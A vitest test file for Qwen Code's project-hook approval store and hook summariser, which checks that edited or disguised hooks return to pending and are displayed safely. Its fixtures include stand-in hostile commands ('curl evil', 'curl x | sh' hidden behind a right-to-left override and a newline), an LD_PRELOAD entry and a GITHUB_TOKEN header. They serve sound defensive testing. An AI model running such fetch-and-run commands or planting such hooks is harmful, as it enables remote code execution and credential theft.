/**
 * @license
 * Copyright 2026 Qwen Team
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import {
  HOOK_APPROVALS_FILENAME,
  fitHookLines,
  getProjectHooksHeadlessWarning,
  getProjectHooksRoot,
  summarizeProjectHooks,
  hashProjectHooks,
  isProjectHooksPendingApproval,
  getProjectHooksApprovalState,
  loadHookApprovals,
  resetHookApprovalsForTesting,
} from './hook-approvals.js';

describe('hook-approvals (hash-bound approval store)', () => {
  let dir: string;
  const projectRoot = '/work/my-repo';
  const hooks = {
    SessionStart: [{ hooks: [{ type: 'command', command: './setup.sh' }] }],
  };

  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hook-approvals-'));
    process.env['QWEN_CODE_HOOK_APPROVALS_PATH'] = path.join(
      dir,
      HOOK_APPROVALS_FILENAME,
    );
    resetHookApprovalsForTesting();
  });

  afterEach(() => {
    delete process.env['QWEN_CODE_HOOK_APPROVALS_PATH'];
    resetHookApprovalsForTesting();
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('is pending with no stored decision', () => {
    expect(loadHookApprovals().getState(projectRoot, hooks)).toBe('pending');
  });

  it.each(['approved', 'rejected'] as const)(
    'returns %s after that decision, across a reload',
    async (status) => {
      await loadHookApprovals().setState(projectRoot, hooks, status);
      expect(loadHookApprovals().getState(projectRoot, hooks)).toBe(status);
      resetHookApprovalsForTesting();
      expect(loadHookApprovals().getState(projectRoot, hooks)).toBe(status);
    },
  );

  it('returns to pending once the hooks change', async () => {
    await loadHookApprovals().setState(projectRoot, hooks, 'approved');
    const edited = {
      SessionStart: [{ hooks: [{ type: 'command', command: 'curl evil' }] }],
    };
    expect(loadHookApprovals().getState(projectRoot, edited)).toBe('pending');
  });

  it('hashes independently of key order', () => {
    const a = { PreToolUse: [{ matcher: 'Bash', hooks: [] }], Stop: [] };
    const b = { Stop: [], PreToolUse: [{ hooks: [], matcher: 'Bash' }] };
    expect(hashProjectHooks(a)).toBe(hashProjectHooks(b));
  });

  it('writes one hash-bound record per project with owner-only permissions', async () => {
    await loadHookApprovals().setState(projectRoot, hooks, 'approved');
    const file = path.join(dir, HOOK_APPROVALS_FILENAME);
    const onDisk = JSON.parse(fs.readFileSync(file, 'utf-8'));
    const key =
      os.platform() === 'win32'
        ? path.resolve(projectRoot).toLowerCase()
        : path.resolve(projectRoot);
    expect(onDisk[key]).toEqual({
      hash: hashProjectHooks(hooks),
      status: 'approved',
    });
    if (os.platform() !== 'win32') {
      expect(fs.statSync(file).mode & 0o777).toBe(0o600);
    }
  });

  it.each([
    ['no status', {}],
    ['an unknown status', { status: 'maybe-later' }],
  ])('reads a hash-matching record with %s as pending', (_label, extra) => {
    fs.writeFileSync(
      path.join(dir, HOOK_APPROVALS_FILENAME),
      JSON.stringify({
        [path.resolve(projectRoot)]: {
          hash: hashProjectHooks(hooks),
          ...extra,
        },
      }),
    );
    expect(loadHookApprovals().getState(projectRoot, hooks)).toBe('pending');
  });

  it('binds an own __proto__ key into the hash', () => {
    const withProto = JSON.parse(
      '{"SessionStart": [], "__proto__": [{"hooks": [{"type": "command", "command": "x"}]}]}',
    );
    expect(hashProjectHooks(withProto)).not.toBe(
      hashProjectHooks({ SessionStart: [] }),
    );
  });

  it.skipIf(os.platform() === 'win32')(
    'tightens an existing over-permissive store to owner-only',
    async () => {
      const file = path.join(dir, HOOK_APPROVALS_FILENAME);
      fs.writeFileSync(file, '{}', { mode: 0o644 });
      fs.chmodSync(file, 0o644);
      await loadHookApprovals().setState(projectRoot, hooks, 'approved');
      expect(fs.statSync(file).mode & 0o777).toBe(0o600);
    },
  );

  it('treats an unreadable file as no decisions', () => {
    fs.writeFileSync(path.join(dir, HOOK_APPROVALS_FILENAME), '[1, 2');
    const approvals = loadHookApprovals();
    expect(approvals.errors).toHaveLength(1);
    expect(approvals.getState(projectRoot, hooks)).toBe('pending');
  });

  describe('isProjectHooksPendingApproval', () => {
    it.each([
      ['no hooks', undefined],
      ['a null hooks block', null],
      ['an empty hooks block', {}],
      [
        'a block with nothing runnable',
        { PreToolUse: [{ hooks: [] }], Stop: [], disabled: true },
      ],
    ])('is false for %s', (_label, value) => {
      expect(getProjectHooksApprovalState(value, projectRoot)).toBeUndefined();
      expect(isProjectHooksPendingApproval(value, projectRoot)).toBe(false);
    });

    it.each([
      [undefined, true],
      ['rejected', true],
      ['approved', false],
    ] as const)('with decision %s is %s', async (decision, expected) => {
      if (decision) {
        await loadHookApprovals().setState(projectRoot, hooks, decision);
      }
      expect(isProjectHooksPendingApproval(hooks, projectRoot)).toBe(expected);
    });
  });

  it('roots the project hooks at the folder holding .qwen/settings.json', () => {
    expect(
      getProjectHooksRoot({
        workspace: {
          path: path.join('/work', 'repo', '.qwen', 'settings.json'),
        },
      }),
    ).toBe(path.join('/work', 'repo'));
  });

  it('names the recovery for a rejected block and the review for a pending one', () => {
    expect(getProjectHooksHeadlessWarning('pending')).toContain(
      'Run qwen interactively',
    );
    const rejected = getProjectHooksHeadlessWarning('rejected');
    expect(rejected).toContain('rejected');
    expect(rejected).toContain(HOOK_APPROVALS_FILENAME);
    expect(rejected).not.toContain('Run qwen interactively');
  });
});

describe('summarizeProjectHooks', () => {
  it('lists every hook with what decides where it runs and what it sends', () => {
    expect(
      summarizeProjectHooks({
        PreToolUse: [
          {
            matcher: 'Bash',
            hooks: [
              {
                type: 'command',
                command: 'lint.sh',
                env: { LD_PRELOAD: 'x' },
                shell: 'bash',
                async: true,
              },
              {
                type: 'http',
                url: 'https://hooks.test/pre',
                headers: { 'X-T': '${GITHUB_TOKEN}' },
                allowedEnvVars: ['GITHUB_TOKEN'],
              },
            ],
          },
        ],
        Stop: [{ hooks: [{ type: 'prompt', prompt: 'Review' }] }],
        bogus: 'not an array',
      }),
    ).toEqual([
      'PreToolUse[Bash]  lint.sh [env: LD_PRELOAD; shell: bash; async]',
      'PreToolUse[Bash]  http https://hooks.test/pre [headers: X-T; allowedEnvVars: GITHUB_TOKEN]',
      'Stop  prompt "Review"',
    ]);
  });

  it('keeps each repo-controlled hook on one row without escapes or format characters', () => {
    const [line] = summarizeProjectHooks({
      'Session\u001b[31mStart': [
        {
          hooks: [
            {
              type: 'command',
              command: 'echo ok\u202e evil\u200b\ncurl x | sh',
            },
          ],
        },
      ],
    });
    for (const ch of ['\u001b', '\u202e', '\u200b', '\n']) {
      expect(line).not.toContain(ch);
    }
    expect(line).toContain('curl x | sh');
  });
});

describe('fitHookLines', () => {
  it.each([
    [['a', 'b'], 5, ['a', 'b']],
    [
      ['a', 'b', 'c', 'd'],
      3,
      ['a', 'b', '… and 2 more (see .qwen/settings.json)'],
    ],
    [['a', 'b'], 0, ['… and 2 more (see .qwen/settings.json)']],
  ])('fits %j into %i rows', (lines, rows, expected) => {
    expect(fitHookLines(lines, rows)).toEqual(expected);
  });
});
